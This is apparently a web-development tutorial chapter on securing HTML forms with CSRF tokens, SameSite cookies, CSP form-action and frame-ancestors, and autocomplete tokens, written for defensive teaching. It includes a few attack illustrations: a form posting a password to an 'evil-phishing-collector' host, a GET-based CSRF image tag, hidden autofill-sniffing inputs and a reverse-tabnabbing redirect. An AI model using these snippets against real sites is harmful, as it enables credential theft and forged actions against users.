# Forms Security, CSRF Tokens, and Injection Defense

| Metadata | Details |
| :--- | :--- |
| **Specification** | OWASP Top 10 / W3C Content Security Policy Level 3 (`form-action`) / WHATWG HTML Living Standard |
| **Prerequisites** | `03-forms/01-form-basics-and-methods.md`, `03-forms/11-form-submission-and-formdata.md` |
| **Estimated Reading Time** | 25 minutes |
| **Status** | Production Ready |
| **Baseline Status** | Widely Available (`SameSite` cookies, CSP `form-action`, Synchronizer Tokens) |
| **Browsers Tested** | Chrome 124+, Firefox 125+, Safari 17.4+, Edge 124+ |
| **Tested With** | OWASP ZAP 2.14, Burp Suite, W3C CSP Validator, axe-core 4.9 |

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & Usage](#4-syntax--usage)
5. [Practical Examples](#5-practical-examples)
   - [Example 1: Anti-CSRF Synchronizer Token in Native HTML Form](#example-1-anti-csrf-synchronizer-token-in-native-html-form)
   - [Example 2: Restricting Form Target Destinations with CSP `form-action`](#example-2-restricting-form-target-destinations-with-csp-form-action)
   - [Example 3: Safe Credential Handling (Current vs. New Password & Autofill Protection)](#example-3-safe-credential-handling-current-vs-new-password--autofill-protection)
   - [Example 4: Double-Submit Cookie Pattern with Fetch and Headers](#example-4-double-submit-cookie-pattern-with-fetch-and-headers)
   - [Example 5: Preventing Clickjacking and Hidden Frame Hijacking](#example-5-preventing-clickjacking-and-hidden-frame-hijacking)
6. [Best Practices](#6-best-practices)
7. [Common Mistakes & Pitfalls](#7-common-mistakes--pitfalls)
8. [Performance, Accessibility, SEO & Security Notes](#8-performance-accessibility-seo--security-notes)
9. [Comparison / When to Use What](#9-comparison--when-to-use-what)
10. [Interview Questions](#10-interview-questions)
11. [Practice Exercises](#11-practice-exercises)
12. [Summary / Cheat Sheet](#12-summary--cheat-sheet)
13. [Further Reading](#13-further-reading)

---

## 1. What & Why

HTML forms are the primary vector through which web applications alter state—executing wire transfers, resetting passwords, updating personal identifiers, and purchasing goods. Because forms handle high-value mutations, they represent the most lucrative target for web attack vectors:
- **Cross-Site Request Forgery (CSRF)**: Forcing an authenticated user's browser to execute unauthorized state changes.
- **Form Action Hijacking**: Tampering with the `<form action="...">` target to leak sensitive user inputs to third-party endpoints.
- **Credential Sniffing via Autofill Exploits**: Hidden or off-screen form inputs tricked by browser autofill algorithms into dumping user identity data.
- **Clickjacking**: Invisible iframe overlays tricking users into submitting forms they cannot see.

Securing HTML forms requires defense-in-depth: combining anti-CSRF synchronizer tokens, `SameSite` cookies, HTTP Content Security Policy (`form-action`, `frame-ancestors`), and strict input hygiene.

---

## 2. Core Concepts

### Cross-Site Request Forgery (CSRF)
In a CSRF attack, an evil site (`attacker.com`) crafts a malicious form that points to `bank.com/transfer`. If a logged-in user visits `attacker.com`, the malicious form submits automatically via JavaScript. Because browsers historically attached session cookies to cross-origin requests, `bank.com` receives a legitimate session cookie and executes the unauthorized transfer.

#### Primary CSRF Defenses:
1. **Synchronizer Token Pattern**: The server embeds a cryptographically random, unpredictable token inside a hidden form input (`<input type="hidden" name="_csrf" value="...">`). When submitted, the backend verifies that the submitted token matches the user's server session. Attackers cannot read this token due to the Same-Origin Policy.
2. **`SameSite` Cookie Attribute**:
   - `SameSite=Strict`: Cookies are never sent on cross-site requests, even following top-level links.
   - `SameSite=Lax`: Cookies are sent on top-level GET navigations, but blocked on cross-site POST/PUT requests.
3. **Custom Request Headers**: Adding non-standard headers (e.g., `X-Requested-With` or `X-CSRF-Token`) on AJAX requests prevents automated cross-origin form posting due to CORS preflight requirements.

### Content Security Policy: `form-action`
The `form-action` CSP directive restricts the URLs which can be used as the target of form submissions from a given context. If malicious XSS attempts to change a form's action attribute to `https://evil.com/steal`, modern browsers block the submission and fire a security report.

---

## 3. How It Works Internally

```
+-----------------------------------------------------------------------------------------+
|                         CSRF Defense: Synchronizer Token Flow                           |
+-----------------------------------------------------------------------------------------+

  1. User requests Form Page (GET /transfer)
       |
       v
  Server generates cryptographically secure token:
  Token = crypto.randomUUID() -> Saved in server session or encrypted cookie
       |
       v
  Server renders HTML:
  <form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d">
    ...
  </form>
       |
       v
  2. Legitimate User clicks Submit:
       |
       +--> Payload includes: _csrf = 9b1deb4d... + Session Cookie
       +--> Server verifies: (submitted _csrf === session._csrf) -> OK! Mutation proceeds.

-------------------------------------------------------------------------------------------

  3. ATTACK SCENARIO: Malicious Site (evil.com) tries to forge POST /transfer
       |
       +--> evil.com submits form to bank.com/transfer
       +--> Browser attaches user's session cookie (if not SameSite=Strict/Lax)
       +--> BUT evil.com CANNOT read the genuine _csrf token (blocked by SOP)!
       +--> Server checks: submitted _csrf is missing or invalid -> 403 Forbidden!
```

---

## 4. Syntax & Usage

```html
<form action="/api/account/email" method="POST">
  <!-- Anti-CSRF Synchronizer Token -->
  <input type="hidden" name="_csrf" value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" />

  <label for="new-email">New Email Address:</label>
  <input type="email" id="new-email" name="new_email" required />

  <button type="submit">Update Email</button>
</form>
```

> **Cross-Browser & Baseline Status Box**
>
> - Hidden input tokens (`<input type="hidden">`): **Baseline Widely Available** across all browsers since HTML 2.0.
> - `SameSite=Lax` / `SameSite=Strict`: **Baseline Widely Available** across all desktop and mobile browsers.
> - CSP `form-action`: **Baseline Widely Available** (CSP Level 2 / 3 supported across Chrome, Firefox, Safari, Edge).

---

## 5. Practical Examples

### Example 1: Anti-CSRF Synchronizer Token in Native HTML Form
A standard financial or settings update form protected by a server-rendered CSRF token.

```html
<form action="/account/transfer" method="post" class="secure-form">
  <!-- Cryptographic CSRF token generated per session or per request -->
  <input 
    type="hidden" 
    name="csrf_token" 
    value="dGhpcy1pcy1hLXNlY3VyZS1jc3JmLXRva2VuLXZhbHVl" 
  />

  <fieldset>
    <legend>Domestic Wire Transfer</legend>

    <div class="form-row">
      <label for="recipient-iban">Recipient IBAN / Account Number:</label>
      <input 
        type="text" 
        id="recipient-iban" 
        name="iban" 
        autocomplete="off" 
        spellcheck="false" 
        required 
      />
    </div>

    <div class="form-row">
      <label for="transfer-amount">Amount (USD):</label>
      <input 
        type="number" 
        id="transfer-amount" 
        name="amount" 
        min="0.01" 
        step="0.01" 
        max="10000" 
        required 
      />
    </div>

    <button type="submit">Authorize Transfer</button>
  </fieldset>
</form>
```

---

### Example 2: Restricting Form Target Destinations with CSP `form-action`
Demonstrating how HTTP response headers lock down form destinations so compromised HTML cannot leak form inputs.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: default-src 'self'; form-action 'self' https://checkout.stripe.com;
X-Frame-Options: DENY
```

```html
<!-- ALLOWED: Matches 'self' -->
<form action="/login" method="post">
  <input type="text" name="user" required />
  <button type="submit">Log In</button>
</form>

<!-- ALLOWED: Explicitly whitelisted external origin -->
<form action="https://checkout.stripe.com/pay" method="post">
  <input type="hidden" name="cart_id" value="4821" />
  <button type="submit">Pay with Stripe</button>
</form>

<!-- BLOCKED BY BROWSER: Not in CSP form-action directive! -->
<!-- Browser halts submission, logs CSP violation, and reports to security endpoint -->
<form action="https://evil-phishing-collector.com/steal" method="post">
  <input type="password" name="password" />
  <button type="submit">Compromised Submit</button>
</form>
```

---

### Example 3: Safe Credential Handling (Current vs. New Password & Autofill Protection)
Protecting against password manager corruption and autofill credential sniffing.

```html
<form action="/account/security/password" method="post">
  <input type="hidden" name="_csrf" value="c3VwZXJzZWNyZXRjc3JmdG9rZW4" />

  <!-- Hidden username field satisfies password manager credential association -->
  <input 
    type="text" 
    name="username" 
    value="alex_dev" 
    autocomplete="username" 
    hidden 
    aria-hidden="true" 
  />

  <div class="field">
    <label for="old-pass">Current Password (Required to verify identity):</label>
    <input 
      type="password" 
      id="old-pass" 
      name="current_password" 
      autocomplete="current-password" 
      required 
    />
  </div>

  <div class="field">
    <label for="new-pass">New Password (Min 12 characters):</label>
    <input 
      type="password" 
      id="new-pass" 
      name="new_password" 
      autocomplete="new-password" 
      minlength="12" 
      required 
    />
  </div>

  <button type="submit">Update Password</button>
</form>
```

---

### Example 4: Double-Submit Cookie Pattern with Fetch and Headers
For stateless single-page applications where the backend does not store session states in memory: the CSRF token is read from a cookie and mirrored into an HTTP header.

```html
<form id="spa-settings-form">
  <label for="display-alias">Public Alias:</label>
  <input type="text" id="display-alias" name="alias" required />
  <button type="submit">Save Alias</button>
</form>

<script>
  // Helper to extract cookie value
  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
  }

  const form = document.getElementById('spa-settings-form');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const csrfToken = getCookie('XSRF-TOKEN');
    const formData = new FormData(form);

    const response = await fetch('/api/settings', {
      method: 'POST',
      body: formData,
      headers: {
        // Custom header prevents blind cross-origin form submission (CORS preflight triggers)
        'X-XSRF-TOKEN': csrfToken,
        'Accept': 'application/json'
      }
    });

    if (response.ok) {
      alert('Settings updated securely.');
    } else {
      alert('Security validation failed.');
    }
  });
</script>
```

---

### Example 5: Preventing Clickjacking and Hidden Frame Hijacking
Mitigating UI redressing attacks where transparent malicious iframes trick users into clicking buttons.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```

```html
<!-- Legacy Frame-Busting defense (Fallback for very old user agents) -->
<script>
  if (window.top !== window.self) {
    window.top.location = window.self.location;
  }
</script>

<form action="/account/delete" method="post">
  <input type="hidden" name="csrf" value="tok_98213" />
  <h2>Delete Account Confirmation</h2>
  <p>Warning: This action is permanent and cannot be undone.</p>
  
  <label for="confirm-text">Type DELETE to confirm:</label>
  <input type="text" id="confirm-text" name="confirmation" pattern="DELETE" required />

  <button type="submit" class="danger-btn">Permanently Delete Account</button>
</form>
```

---

## 6. Best Practices

- [ ] **Always require anti-CSRF tokens on state-changing requests**: Never rely on cookies alone. Embed unique synchronizer tokens into forms or verify custom headers on AJAX endpoints.
- [ ] **Configure `SameSite=Lax` or `SameSite=Strict` on all authentication cookies**: Provides native browser-level immunity against cross-site POST attacks.
- [ ] **Deploy CSP `form-action` headers**: Explicitly whitelist valid form action endpoints (e.g., `form-action 'self' https://api.stripe.com;`) to prevent malicious action redirection.
- [ ] **Defend against Clickjacking with `frame-ancestors 'none'`**: Prevent third-party domains from embedding your sensitive forms inside invisible `<iframe>` overlays.
- [ ] **Differentiate `current-password` and `new-password` in `autocomplete`**: Using `new-password` on login forms risks overwriting existing passwords in user vaults; using `current-password` on registration forms prevents automatic generation.
- [ ] **Strip sensitive form values on cancel or navigate away**: Avoid caching credit card CVV codes or passwords in client memory or DOM attributes.

---

## 7. Common Mistakes & Pitfalls

| Mistake | Severity | Consequence | Correction |
| :--- | :--- | :--- | :--- |
| Using GET requests for state-changing operations | **Critical** | Attackers trigger actions via simple `<img>` tags (`<img src="/transfer?amt=500">`); zero CSRF protection. | Strictly use POST, PUT, or DELETE for state mutations. |
| Storing CSRF tokens in `localStorage` | **Critical** | Accessible to any XSS payload on the origin; compromises the entire security boundary. | Use server-rendered hidden inputs or `HttpOnly` / `SameSite` cookies. |
| Omitting `SameSite` on session cookies | **High** | Browser transmits cookies on cross-origin form submissions by default in legacy browsers. | Set `SameSite=Lax` or `SameSite=Strict` on session cookies. |
| Forgetting CSP `form-action` restrictions | **High** | If attacker achieves DOM-XSS, they can alter `form.action` to steal user inputs upon submit. | Specify `Content-Security-Policy: form-action 'self'`. |
| Blindly disabling autofill via `autocomplete="off"` on password inputs | **Moderate** | Modern browsers ignore `autocomplete="off"` for credentials, frustrating password manager users. | Use explicit tokens like `autocomplete="current-password"` or `new-password`. |
| Allowing forms to be iframed by external sites | **High** | Susceptible to clickjacking / UI redressing attacks. | Set `Content-Security-Policy: frame-ancestors 'none';`. |

---

## 8. Performance, Accessibility, SEO & Security Notes

### Accessibility (WCAG 2.2 AA)
- **Guideline 3.3.8 Accessible Authentication (Level AA - WCAG 2.2)**: Cognitive function tests (e.g., memorizing complex strings or solving math CAPTCHAs) cannot be the sole authentication method. Applications must support copy-paste, password managers, or WebAuthn/passkeys.
- **Guideline 3.3.4 Error Prevention (Legal, Financial, Data)**: Reversible transactions, review/confirmation screens, or explicit confirmation checkboxes must be provided before executing irreversible financial actions.

### Security
- **Defense in Depth**: Never rely on a single layer (e.g., only `SameSite` or only tokens). Combine `SameSite` cookies, synchronizer tokens, and CSP `form-action` for complete resilience against browser quirks and zero-days.

---

## 9. Comparison / When to Use What

| Defense Pattern | Primary Threat Mitigated | Browser Mechanism | Best For |
| :--- | :--- | :--- | :--- |
| **Synchronizer Token Pattern** | Cross-Site Request Forgery (CSRF) | Hidden form input validated against server session. | Traditional Multi-Page Applications (MPAs). |
| **`SameSite=Strict` Cookies** | Cross-Site Request Forgery & Tracking | Browser suppresses cookie transmission across origins. | High-security financial or admin portals. |
| **CSP `form-action`** | Form Hijacking & Phishing Exfiltration | Browser blocks unauthorized submission destinations. | All modern websites handling user input. |
| **CSP `frame-ancestors 'none'`** | Clickjacking / UI Redressing | Browser prevents iframing the document. | All authenticated portals and sensitive forms. |

---

## 10. Interview Questions

<details>
<summary><strong>1. How does the Synchronizer Token Pattern successfully prevent CSRF attacks?</strong></summary>

The server generates an unpredictable, cryptographically random token associated with the user's active session and embeds it inside a hidden form input (`<input type="hidden" name="_csrf" value="...">`). When a malicious third-party site initiates a forged POST request to the server, the browser will automatically include the user's session cookie, but the attacker's script cannot read or predict the genuine CSRF token due to the Same-Origin Policy. When the server inspects the payload and finds the token missing or mismatched, it rejects the request.
</details>

<details>
<summary><strong>2. Does <code>SameSite=Lax</code> make CSRF synchronizer tokens completely obsolete?</strong></summary>

No. While `SameSite=Lax` provides strong protection by blocking cookies on cross-origin POST requests, it is not a complete replacement. Flaws in browser cookie handling, top-level GET vulnerabilities (e.g., poorly designed state-changing GET endpoints), cross-subdomain cookie tossing, and older browsers without `SameSite` support can leave applications vulnerable. OWASP strongly recommends defense-in-depth: combining `SameSite` cookies with anti-CSRF tokens.
</details>

<details>
<summary><strong>3. What does the Content Security Policy directive <code>form-action</code> control, and why is it crucial?</strong></summary>

`form-action` governs the valid destination URLs to which `<form action="...">` elements can submit data. Even if an attacker injects a cross-site script (XSS) that modifies the `action` attribute of a login form to `https://attacker.com/sniff`, the browser checks the CSP `form-action` directive. If the attacker's URL is not listed, the browser refuses to dispatch the HTTP request, preventing credential exfiltration.
</details>

<details>
<summary><strong>4. What is Clickjacking, and how does HTML/HTTP protect sensitive form submissions from it?</strong></summary>

Clickjacking (UI redressing) occurs when an attacker loads a target website inside a transparent `<iframe>` overlaid on top of a lure page (such as a game). When the user clicks on the game, they are unknowingly clicking a "Delete Account" or "Confirm Payment" button inside the invisible iframe. It is mitigated using the HTTP header `Content-Security-Policy: frame-ancestors 'none';` (or `'self'`), or legacy `X-Frame-Options: DENY`.
</details>

<details>
<summary><strong>5. What is the Double-Submit Cookie pattern, and when is it employed?</strong></summary>

In stateless or API-driven architectures where the server does not store session state in RAM, the server sets a cryptographically random token in an un-HttpOnly cookie (e.g., `XSRF-TOKEN`). The frontend JavaScript reads this cookie value and injects it into a custom request header (`X-XSRF-TOKEN`) or hidden form input. Because `evil.com` cannot read cookies belonging to `bank.com` under the Same-Origin Policy, it cannot duplicate the cookie value in the header. The server verifies that the header value matches the cookie value.
</details>

<details>
<summary><strong>6. Why should you avoid using <code>autocomplete="new-password"</code> on a login form?</strong></summary>

`autocomplete="new-password"` signals to password managers that the user is creating or changing their password. If used on a standard login form, the password manager may prompt the user to generate a random password and overwrite their existing stored password in their vault, locking them out of their account. Login forms must use `autocomplete="current-password"`.
</details>

<details>
<summary><strong>7. How can hidden form fields be abused by attackers to sniff user information via browser autofill?</strong></summary>

An attacker can create a form that visually displays only an "Email Address" field, but includes hidden inputs (e.g., `input type="text" name="phone" style="opacity: 0; position: absolute;"`). When the user chooses their profile from the browser autofill prompt, the browser may automatically fill out all recognized fields—including the hidden phone number, address, and full name—transmitting private information the user never intended to share.
</details>

<details>
<summary><strong>8. What is the security risk of using <code>target="_blank"</code> on a form submission without proper rel attributes?</strong></summary>

When a form submits to a new tab via `target="_blank"`, the newly opened page gains access to the originating window object via `window.opener`. An attacker-controlled response page could execute `window.opener.location = "https://phishing-site.com"` (Reverse Tabnabbing). Modern browsers automatically apply `rel="noopener"` by default, but explicitly declaring `rel="noopener noreferrer"` ensures safety across all environments.
</details>

---

## 11. Practice Exercises

### Exercise 1: Secure Account Settings Form (Easy)
- **Task**: Author an HTML form that updates user notification preferences. Include an anti-CSRF hidden token input and explicit `autocomplete` tokens.

<details>
<summary>View Solution</summary>

```html
<form action="/account/preferences" method="post">
  <!-- CSRF Token -->
  <input type="hidden" name="_csrf" value="tok_sec_8723491283" />

  <fieldset>
    <legend>Email Notifications</legend>

    <div>
      <input type="checkbox" id="pref-marketing" name="marketing" value="yes" />
      <label for="pref-marketing">Receive product updates and newsletters</label>
    </div>

    <div>
      <input type="checkbox" id="pref-security" name="security" value="yes" checked disabled />
      <label for="pref-security">Security alerts (Mandatory)</label>
    </div>

    <button type="submit">Save Preferences</button>
  </fieldset>
</form>
```
</details>

---

### Exercise 2: CSP Header and Form Architecture (Medium)
- **Task**: Provide the exact HTTP Content-Security-Policy header directive and corresponding HTML form markup that allows form submissions only to the origin itself and to `https://payments.example.com`.

<details>
<summary>View Solution</summary>

**HTTP Response Header:**
```http
Content-Security-Policy: default-src 'self'; form-action 'self' https://payments.example.com; frame-ancestors 'none';
```

**HTML Markup:**
```html
<form action="https://payments.example.com/checkout" method="post">
  <input type="hidden" name="csrf" value="98234abcfed" />
  <label for="order-total">Order Total:</label>
  <input type="text" id="order-total" name="amount" value="$49.00" readonly />
  <button type="submit">Proceed to Payment</button>
</form>
```
</details>

---

### Exercise 3: Secure Password Change Workflow with Current Password Verification (Hard)
- **Task**: Build an accessible password change form.
- **Requirements**:
  1. Includes a CSRF synchronizer token.
  2. Features current password (`autocomplete="current-password"`), new password (`autocomplete="new-password"`), and confirmation inputs.
  3. Includes accessible instructions indicating password rules.
  4. Implements client-side mismatch checking that sets `aria-invalid="true"` and updates an accessible error message.

<details>
<summary>View Solution</summary>

```html
<form id="pwd-change-form" action="/account/password" method="post" novalidate>
  <input type="hidden" name="_csrf" value="token_val_498213" />

  <h2>Update Your Password</h2>
  <p id="pwd-rules" class="hint-text">
    Password must be at least 12 characters long and contain numbers and symbols.
  </p>

  <div class="field">
    <label for="curr-pwd">Current Password:</label>
    <input 
      type="password" 
      id="curr-pwd" 
      name="current_password" 
      autocomplete="current-password" 
      required 
    />
  </div>

  <div class="field">
    <label for="new-pwd">New Password:</label>
    <input 
      type="password" 
      id="new-pwd" 
      name="new_password" 
      autocomplete="new-password" 
      minlength="12" 
      aria-describedby="pwd-rules" 
      required 
    />
  </div>

  <div class="field">
    <label for="confirm-pwd">Confirm New Password:</label>
    <input 
      type="password" 
      id="confirm-pwd" 
      name="confirm_password" 
      autocomplete="new-password" 
      required 
    />
    <p id="match-error" class="error-msg" hidden></p>
  </div>

  <button type="submit">Change Password</button>
</form>

<script>
  const form = document.getElementById('pwd-change-form');
  const newPwd = document.getElementById('new-pwd');
  const confirmPwd = document.getElementById('confirm-pwd');
  const matchError = document.getElementById('match-error');

  form.addEventListener('submit', (e) => {
    if (newPwd.value !== confirmPwd.value) {
      e.preventDefault();
      confirmPwd.setAttribute('aria-invalid', 'true');
      confirmPwd.setAttribute('aria-describedby', 'match-error');
      matchError.textContent = 'Error: New passwords do not match.';
      matchError.hidden = false;
      confirmPwd.focus();
    } else {
      confirmPwd.removeAttribute('aria-invalid');
      matchError.hidden = true;
    }
  });
</script>
```
</details>

---

## 12. Summary / Cheat Sheet

```
+-------------------------------------------------------------------------------------------------+
|                                 FORM SECURITY QUICK REFERENCE                                   |
+-------------------------------------------------------------------------------------------------+
| Vector / Policy          | Implementation Strategy                                              |
+-------------------------------------------------------------------------------------------------+
| CSRF Synchronizer Token  | <input type="hidden" name="_csrf" value="cryptographic_random_token">|
| SameSite Cookies         | Set-Cookie: session=xyz; SameSite=Lax; Secure; HttpOnly              |
| CSP form-action          | Content-Security-Policy: form-action 'self' https://trusted.com;     |
| Clickjacking Defense     | Content-Security-Policy: frame-ancestors 'none';                     |
| Credential Autofill      | autocomplete="current-password" vs autocomplete="new-password"       |
| Reverse Tabnabbing       | rel="noopener noreferrer" when using target="_blank"                 |
+-------------------------------------------------------------------------------------------------+
```

---

## 13. Further Reading

- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [W3C Content Security Policy Level 3: `form-action`](https://www.w3.org/TR/CSP3/#directive-form-action)
- [MDN Web Docs: Web Security Guidelines](https://developer.mozilla.org/en-US/docs/Web/Security)
- [W3C WCAG 2.2: Guideline 3.3.8 Accessible Authentication](https://www.w3.org/WAI/WCAG22/Understanding/accessible-authentication-minimum.html)

---

[← Previous: Forms Accessibility & Error States](13-forms-accessibility-and-error-states.md) | [Section Index](README.md) | [Next: Dialog & Popover Forms →](15-dialog-and-popover-forms.md)
